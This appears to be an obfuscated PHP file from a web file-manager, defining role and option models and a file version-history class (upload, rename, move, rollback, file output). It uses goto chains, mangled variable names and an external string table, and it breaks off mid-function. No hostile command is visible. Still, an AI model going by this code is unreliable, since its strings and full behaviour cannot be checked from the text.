<?php
 goto Fô´™ ®§†; e™šÆØ¦©Ê: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\x65\155\137\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\x72\157\x6c\x65", "\x72\x6f\154\x65\x47\162\157\x75\160", "\x72\x65\x67\x69\163\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($C ÏàñùŒã) { return "\x53\171\163\x74\x65\x6d\117\160\164\x69\157\156\137{$C ÏàñùŒã}"; } protected function optionDefault($Eó’ï¨Œ­ = '') { $bñ³¶ß‰å =& $_SERVER[¹…ÕÄ]; if ($Eó’ï¨Œ­ == $bñ³¶ß‰å[33]) { return $GLOBALS[$bñ³¶ß‰å[6]][$bñ³¶ß‰å[376]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\162\x6f\x6c\x65\114\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\141\x75\x74\150", "\154\x61\142\145\x6c", "\x64\x69\x73\160\154\141\x79", "\x73\171\x73\164\x65\x6d", "\144\145\163\x63", "\x69\147\156\157\162\x65\105\170\164", "\x69\147\x6e\157\162\x65\x46\151\x6c\x65\123\151\172\x65", "\x61\x64\155\151\156\151\163\x74\162\x61\164\x6f\x72", "\x73\x6f\x72\x74"); public function listData($c‘ğ…ğ = false, $dÉÌ‡±á = "\x73\157\162\x74", $C»âÙİôñ¯ = false) { $EªèÙï‘š× =& $_SERVER[¹…ÕÄ]; $B™²ê•ëØî = parent::listData($c‘ğ…ğ, $dÉÌ‡±á, $C»âÙİôñ¯); if (!$c‘ğ…ğ) { foreach ($B™²ê•ëØî as $D™Ã„ø›İ‰ => $d¸ßéöœ²) { if ($d¸ßéöœ²[$EªèÙï‘š×[1857]] == 1) { $B™²ê•ëØî[$D™Ã„ø›İ‰][$EªèÙï‘š×[425]] = LNG($EªèÙï‘š×[2077]); } } } return $B™²ê•ëØî; } public function update($CÛ¨Ûâì£µ, $c¤èôŞ½) { goto d÷Ë÷‚ç§Ù; d÷Ë÷‚ç§Ù: $cñÊè‚½‰› =& $_SERVER[¹…ÕÄ]; $F˜ôÚ†µĞ = parent::listData($CÛ¨Ûâì£µ); $aÙÚâÁ»Ï½ = $this->findByName($c¤èôŞ½[$cñÊè‚½‰›[28]]); goto d©µÒÏÍª; d©µÒÏÍª: if (!$F˜ôÚ†µĞ || $aÙÚâÁ»Ï½ && $aÙÚâÁ»Ï½[$cñÊè‚½‰›[388]] != $F˜ôÚ†µĞ[$cñÊè‚½‰›[388]]) { return !1; } if ($aÙÚâÁ»Ï½[$cñÊè‚½‰›[1857]] == 1) { $c¤èôŞ½ = array($cñÊè‚½‰›[28] => $c¤èôŞ½[$cñÊè‚½‰›[28]], $cñÊè‚½‰›[1688] => $c¤èôŞ½[$cñÊè‚½‰›[1688]]); } $this->filterAuth($c¤èôŞ½[$cñÊè‚½‰›[400]]); goto bé‡Òôˆö; bé‡Òôˆö: return parent::update($CÛ¨Ûâì£µ, $c¤èôŞ½); goto cïƒÁ°¥Ïù; cïƒÁ°¥Ïù: } public function remove($cëç¦¦•‹¾) { $c¸ÒæèÑƒ¨ = parent::listData($cëç¦¦•‹¾); if (!$c¸ÒæèÑƒ¨ || $c¸ÒæèÑƒ¨[$_SERVER[¹…ÕÄ][1148]]) { return !1; } return parent::remove($cëç¦¦•‹¾); } public function add($A®İ†ßÔ…Õ) { goto BÚä‰Ê•‘¬; BÚä‰Ê•‘¬: $c«Ş©¤Ä£ =& $_SERVER[¹…ÕÄ]; $aëÛÂ²ÉÜè = $A®İ†ßÔ…Õ[$c«Ş©¤Ä£[28]]; if ($this->findByName($aëÛÂ²ÉÜè)) { return !1; } goto F¿Ù¡Ë…¦; Fò«“â¸™ô: return parent::insert($A®İ†ßÔ…Õ); goto c ¤†ö”åò; F¿Ù¡Ë…¦: $cššÇ‘ÅÀ² = array($c«Ş©¤Ä£[407] => $aëÛÂ²ÉÜè, $c«Ş©¤Ä£[1673] => $c«Ş©¤Ä£[33], $c«Ş©¤Ä£[1669] => $c«Ş©¤Ä£[1677], $c«Ş©¤Ä£[2078] => 1, $c«Ş©¤Ä£[1672] => 0, $c«Ş©¤Ä£[2079] => 0, $c«Ş©¤Ä£[1671] => $this->getSort()); $A®İ†ßÔ…Õ = array_merge($cššÇ‘ÅÀ², $A®İ†ßÔ…Õ); $this->filterAuth($A®İ†ßÔ…Õ[$c«Ş©¤Ä£[400]]); goto Fò«“â¸™ô; c ¤†ö”åò: } private function getSort() { $C×¶¶×ö‹™ =& $_SERVER[¹…ÕÄ]; $Dº´¡á½Ù = parent::listData(); $fÎİÖÜ¦Æ× = array_to_keyvalue($Dº´¡á½Ù, $C×¶¶×ö‹™[33], $C×¶¶×ö‹™[1690]); return empty($fÎİÖÜ¦Æ×) ? 0 : max($fÎİÖÜ¦Æ×) + 1; } private function filterAuth(&$bÉ¯‘¹æğ) { $b‹Ñ¤ÍŒ³ì =& $_SERVER[¹…ÕÄ]; $dÇ‡Ë¡ÙŠÀ = array(); $bô„øÁÌ…è = array_filter(explode($b‹Ñ¤ÍŒ³ì[47], $bÉ¯‘¹æğ)); foreach ($bô„øÁÌ…è as $bÉ¯‘¹æğ) { $bö½Õø‹¶ = explode($b‹Ñ¤ÍŒ³ì[94], $bÉ¯‘¹æğ); if ($bö½Õø‹¶[0] == $b‹Ñ¤ÍŒ³ì[2080] && $bö½Õø‹¶[1] != $b‹Ñ¤ÍŒ³ì[1068]) { $c¹‚­ã»†‚ = $bö½Õø‹¶[0] . $b‹Ñ¤ÍŒ³ì[94] . $bö½Õø‹¶[1] . $b‹Ñ¤ÍŒ³ì[2081]; if (!in_array($c¹‚­ã»†‚, $bô„øÁÌ…è)) { $dÇ‡Ë¡ÙŠÀ[] = $c¹‚­ã»†‚; } } $dÇ‡Ë¡ÙŠÀ[] = $bÉ¯‘¹æğ; } $bÉ¯‘¹æğ = implode($b‹Ñ¤ÍŒ³ì[47], $dÇ‡Ë¡ÙŠÀ); } public function sort($DáÃéÕÎâØ, $DøãÃÙœË) { return parent::update($DáÃéÕÎâØ, $DøãÃÙœË); } } goto dßÊĞÎŠ×Î; CŒ÷¥…Õ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto C–²ÂÀºÖ ; C–²ÂÀºÖ : $eÕ¦º½Ó =& $_SERVER[¹…ÕÄ]; $cø•Ëå—Í† = $GLOBALS[$eÕ¦º½Ó[6]][$eÕ¦º½Ó[87]][$eÕ¦º½Ó[1081]]; if ($cø•Ëå—Í† <= 0) { return; } goto C†µÊÆÜ¸¯; e®°¢×éœ“: Hook::bind($eÕ¦º½Ó[1087], $eÕ¦º½Ó[1088]); Hook::bind($eÕ¦º½Ó[1089], $eÕ¦º½Ó[1090]); Hook::bind($eÕ¦º½Ó[1091], $eÕ¦º½Ó[1092]); goto eù¤ëàœÜ; eù¤ëàœÜ: Hook::bind($eÕ¦º½Ó[1093], $eÕ¦º½Ó[1094]); goto E…¼˜ó´µ¸; C†µÊÆÜ¸¯: if (isset($_REQUEST[$eÕ¦º½Ó[1082]]) && $_REQUEST[$eÕ¦º½Ó[1082]] == $eÕ¦º½Ó[86]) { return; } Hook::bind($eÕ¦º½Ó[1083], $eÕ¦º½Ó[1084]); Hook::bind($eÕ¦º½Ó[1085], $eÕ¦º½Ó[1086]); goto e®°¢×éœ“; E…¼˜ó´µ¸: } public static function eventBeforeUpload($E©Ô§…Ø„×) { if ($E©Ô§…Ø„×[3] && $E©Ô§…Ø„×[3] != REPEAT_REPLACE) { return; } $eÁÖ½‰·‚• = self::parsePath($E©Ô§…Ø„×[0]); if (!$eÁÖ½‰·‚•) { return; } self::add($eÁÖ½‰·‚•); } public static function eventBeforeEdit($C»‰²Âğ»…) { $AÇâ†ªÁÓ = self::parsePath($C»‰²Âğ»…[0]); if (!$AÇâ†ªÁÓ) { return; } self::add($AÇâ†ªÁÓ); } public static function eventBeforeCopyFile($FÒèŞ‡ÊƒĞ, $dÎğÒôßÊ, $e†ò†ÒóŞë, $FòĞÂÏáè, $DÆ‘¸œâ, $aºÚ›œ¢Š) { $fÎŠ¹Ùİ½° = $e†ò†ÒóŞë->getPathOuter($FòĞÂÏáè); $e•ê®£ÈÌ = self::parsePath($fÎŠ¹Ùİ½°); if (!$e•ê®£ÈÌ) { return; } self::add($e•ê®£ÈÌ); } public static function eventBeforeRename($bÕğªÕòÄŞ) { $aº¬×Î¸¿ =& $_SERVER[¹…ÕÄ]; $BèÆ‡‘ÒÈ² = self::parsePath($bÕğªÕòÄŞ[0]); if (!$BèÆ‡‘ÒÈ²) { return; } $AãˆÍ«ŞŒ¤ = self::checkInHistory($BèÆ‡‘ÒÈ²); if (!$AãˆÍ«ŞŒ¤) { return; } if ($AãˆÍ«ŞŒ¤[$aº¬×Î¸¿[29]] == $aº¬×Î¸¿[173]) { $E°Ù†ìÆù = self::listData($BèÆ‡‘ÒÈ²); if ($E°Ù†ìÆù && $E°Ù†ìÆù[$aº¬×Î¸¿[365]]) { self::moveHistory($BèÆ‡‘ÒÈ², $bÕğªÕòÄŞ[1]); } } else { IO::rename($AãˆÍ«ŞŒ¤[$aº¬×Î¸¿[75]], $bÕğªÕòÄŞ[1]); } } public static function eventBeforeMove($EĞÏÂ´º¨) { goto c®½ˆğÜÜœ; c®½ˆğÜÜœ: $cï­ëŞòÅ =& $_SERVER[¹…ÕÄ]; $Eóµé×°í = self::parsePath($EĞÏÂ´º¨[0]); if (!$Eóµé×°í) { return; } goto e™¥ÅïŠÙ²; e™¥ÅïŠÙ²: $F°„…ğ¨•Ä = self::parsePath($EĞÏÂ´º¨[1]); if (!$F°„…ğ¨•Ä) { return; } $f¡§áºîÔ´ = $EĞÏÂ´º¨[3]; goto d¦¡ŒÄ…˜‰; A®Êİ„©­…: if ($dõï®å–õ[$cï­ëŞòÅ[29]] == $cï­ëŞòÅ[173]) { $AÁ¤íğ»„² = self::listData($Eóµé×°í); $BİĞø…ÂĞ = rtrim($F°„…ğ¨•Ä, $cï­ëŞòÅ[8]) . $cï­ëŞòÅ[8] . ($f¡§áºîÔ´ ? $f¡§áºîÔ´ : get_path_this($Eóµé×°í)); $c¼ê±ôÂâ‘ = self::listData($BİĞø…ÂĞ); if ($AÁ¤íğ»„² && $AÁ¤íğ»„²[$cï­ëŞòÅ[365]] && $c¼ê±ôÂâ‘ && $c¼ê±ôÂâ‘[$cï­ëŞòÅ[365]]) { return self::clear($Eóµé×°í); } if ($AÁ¤íğ»„² && $AÁ¤íğ»„²[$cï­ëŞòÅ[365]]) { self::moveHistory($Eóµé×°í, $f¡§áºîÔ´, $e»Â ù·‰æ); } } else { IO::move($dõï®å–õ[$cï­ëŞòÅ[75]], $e»Â ù·‰æ, !1, $f¡§áºîÔ´); self::clearEmptyFolder(IO::pathFather($dõï®å–õ[$cï­ëŞòÅ[75]])); } goto E”½®ÁœÅÕ; d¦¡ŒÄ…˜‰: $dõï®å–õ = self::checkInHistory($Eóµé×°í); if (!$dõï®å–õ) { return; } $e»Â ù·‰æ = self::pathHistory($F°„…ğ¨•Ä); goto A®Êİ„©­…; E”½®ÁœÅÕ: } public static function eventAfterRemove($aÛÉ†††ì¾, $aƒ°‹Óø•ê) { goto eÈÜïŒµÂ; D£œÙĞîá: if (!$cÀƒ•ƒËÌº) { return; } $A–ŒáóŠ„Û = self::checkInHistory($cÀƒ•ƒËÌº); if (!$A–ŒáóŠ„Û) { return; } goto B¥”È¿ñõ; eÈÜïŒµÂ: $Bîí„¾ÌŞõ =& $_SERVER[¹…ÕÄ]; if (!$aƒ°‹Óø•ê) { return; } $cÀƒ•ƒËÌº = self::parsePath($aÛÉ†††ì¾[0]); goto D£œÙĞîá; B¥”È¿ñõ: if ($A–ŒáóŠ„Û[$Bîí„¾ÌŞõ[29]] == $Bîí„¾ÌŞõ[173]) { $FÚÓËò®¥Ó = self::listData($cÀƒ•ƒËÌº, !1); if ($FÚÓËò®¥Ó && $FÚÓËò®¥Ó[$Bîí„¾ÌŞõ[365]]) { self::clear($cÀƒ•ƒËÌº, !1); } } else { IO::remove($A–ŒáóŠ„Û[$Bîí„¾ÌŞõ[75]]); self::clearEmptyFolder(IO::pathFather($A–ŒáóŠ„Û[$Bîí„¾ÌŞõ[75]])); } goto E¹æøÍÓÛô; E¹æøÍÓÛô: } private static function checkInHistory($BÖË„¦  Ş) { $f•öìá²Â” = self::pathHistory($BÖË„¦  Ş); if (!IO::exist($f•öìá²Â”)) { $f•öìá²Â” .= $_SERVER[¹…ÕÄ][1095]; } return IO::exist($f•öìá²Â”) ? IO::info($f•öìá²Â”) : !1; } private static function parsePath($BÌĞ”ôõòÓ) { goto A‰Ú³ƒˆµÑ; Eã¤°´‚–ì: if (!$EŒéèÒæ÷› || !$b¢Ü—¡Ëïù[$eåÙ°›İ“µ[1097]]) { return !1; } if ($C‘òÊ’ˆ == KodIO::KOD_SHARE_ITEM) { $a¶Š…¼Ÿá = IO::init($BÌĞ”ôõòÓ); if ($a¶Š…¼Ÿá->pathParse[$eåÙ°›İ“µ[1026]]) { return self::parsePath($a¶Š…¼Ÿá->pathParse[$eåÙ°›İ“µ[1026]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bÛİßÔÔŸÛ; CÀøë˜óœ³: $b¢Ü—¡Ëïù = KodIO::parse($BÌĞ”ôõòÓ); $C‘òÊ’ˆ = $b¢Ü—¡Ëïù[$eåÙ°›İ“µ[29]]; $EŒéèÒæ÷› = !$C‘òÊ’ˆ || $C‘òÊ’ˆ == KodIO::KOD_IO || $C‘òÊ’ˆ == KodIO::KOD_SHARE_ITEM; goto Eã¤°´‚–ì; Båå®µ»š™: return $BÌĞ”ôõòÓ; goto dè‹à·«Şï; bÛİßÔÔŸÛ: $d—§ÛšÍÄì = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eåÙ°›İ“µ[1098]); foreach ($d—§ÛšÍÄì as $bğñ•ÑÂË) { if (!$C‘òÊ’ˆ && substr($BÌĞ”ôõòÓ, 0, strlen($bğñ•ÑÂË)) == $bğñ•ÑÂË) { return !1; } } self::log($GLOBALS[$eåÙ°›İ“µ[1021]] . $eåÙ°›İ“µ[1099] . $BÌĞ”ôõòÓ); goto Båå®µ»š™; A‰Ú³ƒˆµÑ: $eåÙ°›İ“µ =& $_SERVER[¹…ÕÄ]; if (!$BÌĞ”ôõòÓ) { return !1; } if ($GLOBALS[$eåÙ°›İ“µ[1096]]) { return; } goto CÀøë˜óœ³; dè‹à·«Şï: } private static function pathHistory($fô·¦º¹êÉ) { $D¹«ÒƒïëÜ =& $_SERVER[¹…ÕÄ]; $cÊ¹è™è‡‹ = self::$_historyBase . ltrim(KodIO::clear($fô·¦º¹êÉ), $D¹«ÒƒïëÜ[8]); $cÊ¹è™è‡‹ = str_replace(array($D¹«ÒƒïëÜ[1100]), array($D¹«ÒƒïëÜ[1101]), $cÊ¹è™è‡‹); return $cÊ¹è™è‡‹; } public static function log($BÙËÍ·Š§Ğ) { } public static function historyCount($eƒÄÃ‚Îâí) { $BÕĞˆš²¨ =& $_SERVER[¹…ÕÄ]; $Eµ«³ˆÊñÜ = array(); $EöŠí¡·À = array(); foreach ($eƒÄÃ‚Îâí as $EÏÊ¥¸«–Ã) { $f‹¾­ÆÜÔÁ = get_path_father($EÏÊ¥¸«–Ã); if (!$EöŠí¡·À[$f‹¾­ÆÜÔÁ]) { $EöŠí¡·À[$f‹¾­ÆÜÔÁ] = array(); } $EöŠí¡·À[$f‹¾­ÆÜÔÁ][] = get_path_this($EÏÊ¥¸«–Ã); } foreach ($EöŠí¡·À as $f‹¾­ÆÜÔÁ => $AÆ¸ç¿øŠİ) { $B“¦ŠÖ‡ = self::parsePath($f‹¾­ÆÜÔÁ); if (!$B“¦ŠÖ‡) { continue; } foreach ($AÆ¸ç¿øŠİ as $D“™ù—º¬ˆ) { $eªÁÎ…» = self::listData(rtrim($B“¦ŠÖ‡, $BÕĞˆš²¨[8]) . $BÕĞˆš²¨[8] . $D“™ù—º¬ˆ, !1); if ($eªÁÎ…» && $eªÁÎ…»[$BÕĞˆš²¨[365]]) { $Eµ«³ˆÊñÜ[rtrim($f‹¾­ÆÜÔÁ, $BÕĞˆš²¨[8]) . $BÕĞˆš²¨[8] . $D“™ù—º¬ˆ] = count($eªÁÎ…»[$BÕĞˆš²¨[365]]); } } } return $Eµ«³ˆÊñÜ; } public static function add($A£®„”­¿´) { goto cŠ ¦—³Øî; EÏĞÙ»œÙ­: return self::saveData($c×ñ¶—·ƒ[$F´ËùÔ¨Ì[1108]], $Cˆ‘£²èà); goto d½Æ®à§İ†; d¾À›øÉ‹Ú: if (!$f£µè‹ŠÈÉ) { self::clearEmptyFolder($c×ñ¶—·ƒ[$F´ËùÔ¨Ì[1107]]); return !1; } array_unshift($Cˆ‘£²èà, $C§‹ƒŞŒÅÓ); if (count($Cˆ‘£²èà) > $FÈ—¯Õ¼) { $F’ïÁîáº = array_slice($Cˆ‘£²èà, $FÈ—¯Õ¼); foreach ($F’ïÁîáº as $c¹„§÷—‰Š) { IO::remove($c×ñ¶—·ƒ[$F´ËùÔ¨Ì[1107]] . $c¹„§÷—‰Š[$F´ËùÔ¨Ì[28]]); } $Cˆ‘£²èà = array_slice($Cˆ‘£²èà, 0, $FÈ—¯Õ¼); } goto EÏĞÙ»œÙ­; eÆ¥¤¿¿ë•: if ($Fºêİ‡îŒ— <= 0) { return; } $CÏÄÊÈßµ = IO::hashSimple($A£®„”­¿´); $cİÙ¾è¤¼Ò = IO::info($A£®„”­¿´); goto b“·áËŸÔÎ; b“·áËŸÔÎ: $Cˆ‘£²èà = $c×ñ¶—·ƒ[$F´ËùÔ¨Ì[365]]; if ($cİÙ¾è¤¼Ò[$F´ËùÔ¨Ì[77]] == 0) { return; } if ($cİÙ¾è¤¼Ò[$F´ËùÔ¨Ì[77]] >= 1024 * 1024 * 500) { return !1; } goto AƒÉ‚ÒĞŒ×; c¯ÛÁ¦ùÕÛ: $C§‹ƒŞŒÅÓ = array($F´ËùÔ¨Ì[388] => $CéØÔ¯Ó§, $F´ËùÔ¨Ì[170] => $CÏÄÊÈßµ, $F´ËùÔ¨Ì[28] => $cİÙ¾è¤¼Ò[$F´ËùÔ¨Ì[28]] . $F´ËùÔ¨Ì[94] . date($F´ËùÔ¨Ì[1105]) . rand_string(1), $F´ËùÔ¨Ì[77] => $cİÙ¾è¤¼Ò[$F´ËùÔ¨Ì[77]], $F´ËùÔ¨Ì[426] => USER_ID, $F´ËùÔ¨Ì[192] => time(), $F´ËùÔ¨Ì[1106] => $F´ËùÔ¨Ì[33]); IO::mkdir($c×ñ¶—·ƒ[$F´ËùÔ¨Ì[1107]]); $f£µè‹ŠÈÉ = IO::copy($A£®„”­¿´, $c×ñ¶—·ƒ[$F´ËùÔ¨Ì[1107]], !1, $C§‹ƒŞŒÅÓ[$F´ËùÔ¨Ì[28]]); goto d¾À›øÉ‹Ú; AƒÉ‚ÒĞŒ×: if ($Cˆ‘£²èà && $Cˆ‘£²èà[0][$F´ËùÔ¨Ì[170]] == $CÏÄÊÈßµ) { return !0; } if (array_key_exists($F´ËùÔ¨Ì[194], $cİÙ¾è¤¼Ò) && !$cİÙ¾è¤¼Ò[$F´ËùÔ¨Ì[194]]) { return !1; } $CéØÔ¯Ó§ = short_id(time()); goto c¯ÛÁ¦ùÕÛ; F„¿·ËŒ®½: $aæìÜÎ‚¦ä = Model($F´ËùÔ¨Ì[1102])->get($F´ËùÔ¨Ì[1103]); $Fºêİ‡îŒ— = $GLOBALS[$F´ËùÔ¨Ì[6]][$F´ËùÔ¨Ì[87]][$F´ËùÔ¨Ì[1081]]; $FÈ—¯Õ¼ = $aæìÜÎ‚¦ä == $F´ËùÔ¨Ì[1104] ? 5 : $Fºêİ‡îŒ—; goto eÆ¥¤¿¿ë•; cŠ ¦—³Øî: $F´ËùÔ¨Ì =& $_SERVER[¹…ÕÄ]; $c×ñ¶—·ƒ = self::listData($A£®„”­¿´); if (!$c×ñ¶—·ƒ) { return; } goto F„¿·ËŒ®½; d½Æ®à§İ†: } public static function remove($Aïˆ±ïÃµ, $bõÉª¥´Âˆ) { $fÔàÅ²ï =& $_SERVER[¹…ÕÄ]; $C½ĞÜ¢ = self::listData($Aïˆ±ïÃµ); $BçéÄÍÜåÍ = array(); if (!$C½ĞÜ¢) { return !1; } foreach ($C½ĞÜ¢[$fÔàÅ²ï[365]] as $cáÏƒõª¶®) { if ($cáÏƒõª¶®[$fÔàÅ²ï[388]] == $bõÉª¥´Âˆ) { IO::remove($C½ĞÜ¢[$fÔàÅ²ï[1107]] . $cáÏƒõª¶®[$fÔàÅ²ï[28]]); continue; } $BçéÄÍÜåÍ[] = $cáÏƒõª¶®; } return self::saveData($C½ĞÜ¢[$fÔàÅ²ï[1108]], $BçéÄÍÜåÍ); } public static function clear($FÄ¾–™µæ¦, $c»ßÌáù = true) { $bÎå¹àÑ£¤ =& $_SERVER[¹…ÕÄ]; $f™†÷„Œá = self::listData($FÄ¾–™µæ¦, $c»ßÌáù); if (!$f™†÷„Œá) { return !1; } foreach ($f™†÷„Œá[$bÎå¹àÑ£¤[365]] as $a‡†áÒ»¹) { IO::remove($f™†÷„Œá[$bÎå¹àÑ£¤[1107]] . $a‡†áÒ»¹[$bÎå¹àÑ£¤[28]]); } return self::saveData($f™†÷„Œá[$bÎå¹àÑ£¤[1108]], array()); } public static function moveHistory($fĞ¿ææóĞ×, $C…ÒåÇ†Êê = '', $C†ÏÂ˜¼¡’ = '') { goto C»©•½èì; eÊìãá…: $Eƒ¯ïå‹ğ‰ = substr(get_path_this($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1108]]), 0, -strlen($E¤Ä·Ä Ë¦)); foreach ($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[365]] as $c½É¼…®ñï => $c•òÍŸºç–) { $c˜±ßªÉ® = $C…ÒåÇ†Êê . substr($c•òÍŸºç–[$bÒï ¦å¬ó[28]], strlen($Eƒ¯ïå‹ğ‰)); $dÜòÎéÚ– = IO::move($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1107]] . $c•òÍŸºç–[$bÒï ¦å¬ó[28]], $C†ÏÂ˜¼¡’, !1, $c˜±ßªÉ®); if ($dÜòÎéÚ–) { $b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[365]][$c½É¼…®ñï][$bÒï ¦å¬ó[28]] = $c˜±ßªÉ®; } } $b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1108]] = IO::move($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1108]], $C†ÏÂ˜¼¡’, !1, $C…ÒåÇ†Êê . $E¤Ä·Ä Ë¦); goto A¶Ë¬±·Ó; Eó»Â‹·¦Ş: $E¤Ä·Ä Ë¦ = $bÒï ¦å¬ó[1095]; $C…ÒåÇ†Êê = $C…ÒåÇ†Êê ? $C…ÒåÇ†Êê : get_path_this($fĞ¿ææóĞ×); $C†ÏÂ˜¼¡’ = $C†ÏÂ˜¼¡’ ? $C†ÏÂ˜¼¡’ : $b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1107]]; goto eÊìãá…; C»©•½èì: $bÒï ¦å¬ó =& $_SERVER[¹…ÕÄ]; $b·Ñ¡ˆÊñ» = self::listData($fĞ¿ææóĞ×, !1); if (!$b·Ñ¡ˆÊñ» || !$b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[365]]) { return !1; } goto Eó»Â‹·¦Ş; A¶Ë¬±·Ó: self::saveData($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1108]], $b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[365]]); self::clearEmptyFolder($b·Ñ¡ˆÊñ»[$bÒï ¦å¬ó[1107]]); goto CŠÈ™¿©œ; CŠÈ™¿©œ: } public static function rollback($C½“›Üù¤, $AÚ–±øÃÓğ) { $añõ¸Í¯äù =& $_SERVER[¹…ÕÄ]; $B²¦Ö˜øêÓ = self::listData($C½“›Üù¤); if (!$B²¦Ö˜øêÓ) { return; } $aÃù²Ï¯‡ = IO::info($C½“›Üù¤); foreach ($B²¦Ö˜øêÓ[$añõ¸Í¯äù[365]] as $dÚ”Á˜³ => $c¼¤Ê©ØÙà) { if ($c¼¤Ê©ØÙà[$añõ¸Í¯äù[388]] == $AÚ–±øÃÓğ) { self::add($C½“›Üù¤); $aÇîâİÉø = $B²¦Ö˜øêÓ[$añõ¸Í¯äù[1107]] . $c¼¤Ê©ØÙà[$añõ¸Í¯äù[28]]; $C•¸Îò—éß = IO::copy($aÇîâİÉø, IO::pathFather($C½“›Üù¤), REPEAT_REPLACE, $aÃù²Ï¯‡[$añõ¸Í¯äù[28]]); if ($C•¸Îò—éß) { self::remove($C½“›Üù¤, $AÚ–±øÃÓğ); } return $C•¸Îò—éß; } } return !1; } public static function setDetail($CòÀä’Î”Ã, $eÄ¼×ì”˜›, $b¹²çğ‚“”) { $Aª˜º“š  =& $_SERVER[¹…ÕÄ]; $cÔÓÅ”¾ºø = self::listData($CòÀä’Î”Ã); if (!$cÔÓÅ”¾ºø) { return; } foreach ($cÔÓÅ”¾ºø[$Aª˜º“š [365]] as $bä’¡Ä¢ è => $DÓÂ²¹‰ìî) { if ($DÓÂ²¹‰ìî[$Aª˜º“š [388]] == $eÄ¼×ì”˜›) { $cÔÓÅ”¾ºø[$Aª˜º“š [365]][$bä’¡Ä¢ è][$Aª˜º“š [1106]] = $b¹²çğ‚“”; self::saveData($cÔÓÅ”¾ºø[$Aª˜º“š [1108]], $cÔÓÅ”¾ºø[$Aª˜º“š [365]]); return !0; } } return !1; } public static function fileInfo($cŸ‰Œä·áó, $e´©ƒêé±) { goto e„œæÈ„±ƒ; e„œæÈ„±ƒ: $Eô õÉ™é =& $_SERVER[¹…ÕÄ]; $d»¶Œ£·×„ = self::listData($cŸ‰Œä·áó); if (!$d»¶Œ£·×„) { show_json(LNG($Eô õÉ™é[104]), !1); } goto A‡ñ¶—ÂÛ’; BÒ‹ßâ„ğ: return IO::info($f‰Â Çµù§); goto eñÅÆµàİÆ; A‡ñ¶—ÂÛ’: $f‰Â Çµù§ = $Eô õÉ™é[33]; foreach ($d»¶Œ£·×„[$Eô õÉ™é[365]] as $AÄò¯Çõ® => $b‡†§‘‚Ù¥) { if ($b‡†§‘‚Ù¥[$Eô õÉ™é[388]] != $e´©ƒêé±) { continue; } $f‰Â Çµù§ = $d»¶Œ£·×„[$Eô õÉ™é[1107]] . $b‡†§‘‚Ù¥[$Eô õÉ™é[28]]; break; } if (!$f‰Â Çµù§) { show_json(LNG($Eô õÉ™é[104]), !1); } goto BÒ‹ßâ„ğ; eñÅÆµàİÆ: } public static function fileOut($fÊñæÀ¼•‚, $a÷éæÂ‚õØ, $B²‚»ß­šÕ = false) { $f—ù‘èµ¥ =& $_SERVER[¹…ÕÄ]; $fáŒ¿âÂŒ® = self::fileInfo($fÊñæÀ¼•‚, $a÷éæÂ‚õØ); $BÀåÜÔò¹‡ =& $GLOBALS[$f—ù‘èµ¥[7]]; $B²‚»ß­šÕ = isset($BÀåÜÔò¹‡[$f—ù‘èµ¥[1072]]) && $BÀåÜÔò¹‡[$f—ù‘èµ¥[1072]] == 1; if (isset($BÀåÜÔò¹‡[$f—ù‘èµ¥[29]]) && $BÀåÜÔò¹‡[$f—ù‘èµ¥[29]] == $f—ù‘èµ¥[1109]) { return IO::fileOutImage($fáŒ¿âÂŒ®[$f—ù‘èµ¥[75]], $BÀåÜÔò¹‡[$f—ù‘èµ¥[1110]]); } IO::fileOut($fáŒ¿âÂŒ®[$f—ù‘èµ¥[75]], $B²‚»ß­šÕ, get_path_this($fÊñæÀ¼•‚)); } public static function listData($e´øŒŠ¸í´, $BÅ¬«¾Ñö = true) { goto C„ØÖÕ×ê; C„ØÖÕ×ê: $Eé‰‚ğĞ¯ =& $_SERVER[¹…ÕÄ]; if ($BÅ¬«¾Ñö && !IO::exist($e´øŒŠ¸í´)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto eÜÜ¸ö¹; cä‘ñõëŸ‰: $eÃÑùÚÍ = IO::getContent($AÃªÁŞ“ï[$Eé‰‚ğĞ¯[1108]]); if ($eÃÑùÚÍ) { $e£™£ÄŞ = json_decode($eÃÑùÚÍ, !0); if (is_array($e£™£ÄŞ)) { $AÃªÁŞ“ï[$Eé‰‚ğĞ¯[365]] = $e£™£ÄŞ; } } return $AÃªÁŞ“ï; goto d«¼Óš“ôÁ; eÜÜ¸ö¹: if (substr($e´øŒŠ¸í´, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $a¿‹ÆˆâÌí = self::pathHistory($e´øŒŠ¸í´); $AÃªÁŞ“ï = array($Eé‰‚ğĞ¯[1108] => $a¿‹ÆˆâÌí . $Eé‰‚ğĞ¯[1095], $Eé‰‚ğĞ¯[1107] => rtrim(get_path_father($a¿‹ÆˆâÌí), $Eé‰‚ğĞ¯[8]) . $Eé‰‚ğĞ¯[8], $Eé‰‚ğĞ¯[365] => array()); goto cä‘ñõëŸ‰; d«¼Óš“ôÁ: } private static function saveData($DÖ“Š£‰ÁØ, $EÊĞÂ½ŒµŒ) { goto A·šŠß†”×; AÌ³À´Î´Å: $Eƒ¨êÜ¶ = IO::pathFather($DÖ“Š£‰ÁØ); IO::remove($DÖ“Š£‰ÁØ); self::clearEmptyFolder($Eƒ¨êÜ¶); goto DÙ—¾Ô¬¯; A·šŠß†”×: $BÙõ©Š°¬Û =& $_SERVER[¹…ÕÄ]; 